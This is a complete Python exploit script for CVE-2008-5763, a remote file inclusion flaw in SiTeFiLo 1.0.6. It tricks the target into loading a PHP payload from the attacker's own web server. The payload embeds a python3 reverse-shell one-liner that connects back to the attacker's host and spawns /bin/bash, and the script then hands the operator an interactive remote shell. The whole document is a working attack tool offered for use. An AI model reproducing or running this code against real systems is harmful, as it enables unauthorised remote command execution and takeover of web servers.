#!/bin/python3

import socket
import requests
import time
import sys
import re
from multiprocessing.dummy import Pool
from random import randint
import os

def print_usage():
	print("+ --------------------------------- SiTeFiLo RCE ---------------------------------")
	print("| ")
	print("| Author: Robin van den Hurk")
	print("| CVE: 2008-5763")
	print("| GitHub: ")
	print("| ")
	print("| Vulnerable software: SiTeFiLo 1.0.6")
	print("| ")
	print("| This script automatically creates a reverse shell to the vulnerable machine")
	print("| By using a Remote File Inclusion vulnerability in the slogin_lib.inc.php file")
	print("| ")
	print("| Usage: python {0} <lhost> <vulnerable_url> [lport] [web_port]".format(sys.argv[0]))
	print("| Example: python {0} http://10.10.10.6/slogin_lib.inc.php 10.10.10.5".format(sys.argv[0]))
	print("| ")
	print("| Arguments")
	print("| 	- vulnerable_url: Full url to the vulnerable slogin_lib.inc.php file")
	print("| 	- lhost: Local IP (Reachable from the target host)")
	print("| 	- lport: Local port to listen on (Default = Random)")
	print("| 	- web_port: Web port to use during the exploit (Default = Random)")
	print("| ")
	print("+ --------------------------------------------------------------------------------")

def prepare_socket(port):
	sock_rev = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock_rev.bind(('', port))
	sock_rev.listen(1)

	return sock_rev

def handle_payload(sock_payload):
	con_payload = sock_payload.accept()[0]

	data = "HTTP/1.0 200 OK\n"
	data += "\n"
	data += payload

	con_payload.send(data) # Send payload
	con_payload.close() # Close the connection
	sock_payload.close() # Close the socket

def send_request():
	url = "{0}?slogin_path=http://{1}:{2}/".format(vulnerable_url, lhost, web_port)
	
	# Don't wait for the response
	Pool(1).apply_async(requests.get, args=[url], kwds={'verify': False})

def handle_command(command, con_shell):
	if (command == "exit"):
		# Send the exit command to the remote machine
		con_shell.send(command + '\n')
		# Close the socket
		con_shell.close()

	elif (command == "clear"):
		# Clear the terminal
		os.system("clear")
		# Get back the prompt
		con_shell.send('\n')

	else:
		# Just send the command
		con_shell.send(command + '\n')

def shell_interact(sock_shell):
	con_shell = sock_shell.accept()[0]

	try:
		while(True):
			time.sleep(.3) # Give the connection some time to catch up
			response = con_shell.recv(0x10000) # Retrieve the server response

			# Format the output
			output = response
			response_splitted = response.split("\n")

			if (len(response_splitted) > 1):
				# Remove the first line (The executed command)
				# Not tested for Windows machines; Might format cmd output incorrectly
				output = '\n'.join(response_splitted[1:])

			sys.stdout.write(output)
			command = raw_input('')

			handle_command(command, con_shell)
	except:
		pass
	finally:
		sock_shell.close()
		print("\n[-] Shell dropped")


arg_len = len(sys.argv)

if (arg_len < 3):
	print_usage()
	exit()

# Set arguments
lhost = sys.argv[1]
vulnerable_url = sys.argv[2]
lport = int(sys.argv[3]) if 3 < len(sys.argv) else randint(49152,65535)
web_port = int(sys.argv[4]) if 4 < len(sys.argv) else randint(49152,65535)

# Set variables
payload = "<?php echo(exec(\"python3 -c \\\"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{0}',{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')\\\"\")); exit(); ?>".format(lhost, lport)

# Prepare sockets
sock_payload = prepare_socket(web_port)
sock_shell = prepare_socket(lport)

# Make remote server request file
print("[+] Triggering Remote File Inclusion...")
send_request()

# Catch request and send payload
print("[+] Sending payload...")
handle_payload(sock_payload)

# Handle reverse shell callback
print("[+] Spawning shell...")
shell_interact(sock_shell)
